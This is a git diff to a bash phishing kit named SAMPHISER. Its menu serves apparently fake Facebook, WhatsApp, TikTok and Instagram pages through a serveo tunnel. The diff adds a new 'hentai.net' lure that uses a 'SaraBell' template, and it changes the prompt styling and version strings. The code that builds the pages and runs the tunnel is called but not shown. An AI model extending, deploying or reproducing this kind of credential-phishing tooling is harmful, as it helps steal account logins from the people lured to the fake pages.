@@ -87,10 +87,10 @@ fi
 
  USER="root𐪕sasame"
 
-PLAY2="${WHITE}┌──(${MAGENTA}$USER${WHITE})‒[${WHITE} ${ORANGE}bunny girl senpai${WHITE} ] ...
-└─${MAGENTA}>: ${WHITE}"
+PLAY2="${WHITE}┌──($USER${WHITE})‒[${WHITE} ${RED}try Ctrl +   cleatC to close${WHITE} ] ...
+└─${RED}>: ${WHITE}"
 
-__VERSION__="0.0.2"
+__VERSION__="0.2.3"
 
 banner(){
     clear
@@ -131,7 +131,7 @@ ${WHITE}|___/\__._||___/\__._|_| |_| |_|\___|
                        ${WHITE}Version: $__VERSION__
 ${ORANGEBG}${BLACK} SAMPHISER ABOUT! ${RESETBG}
 
-Version :   0.0.1
+Version :   $__VERSION__
 Author  :   sasame
 Creator :   kym-sam
 
@@ -148,7 +148,8 @@ terminal
 help_phisher(){
 cat << EOF
 sam facebook.net         sam whatsapp.net 
-sam tiktok.net           sam instagram.net    
+sam tiktok.net           sam instagram.net   
+sam hentai.net 
 EOF
 }
 
@@ -199,6 +200,12 @@ read -p "$PLAY2" mik
       elif [ "$mik" == "sam facebook.net" ]; then
    printf "\n$mik" >> .history/sam_history.dat
    website='facebook'
+   setup_site
+   start_serveo
+
+    elif [ "$mik" == "sam hentai.net" ]; then
+   printf "\n$mik" >> .history/sam_history.dat
+   website='SaraBell'
    setup_site
    start_serveo
    
@@ -271,7 +278,7 @@ help(){
 cat << EOF
 ${WHITE}
 WELCOME!
-Bash sam.sh${WHITE} Version: 0.0.2 - 2024
+Bash sam.sh${WHITE} Version: $__VERSION__ - 2024
 Github : ${BLUE}https://github.com/kym-sam${WHITE}
 
 COMMANDS:
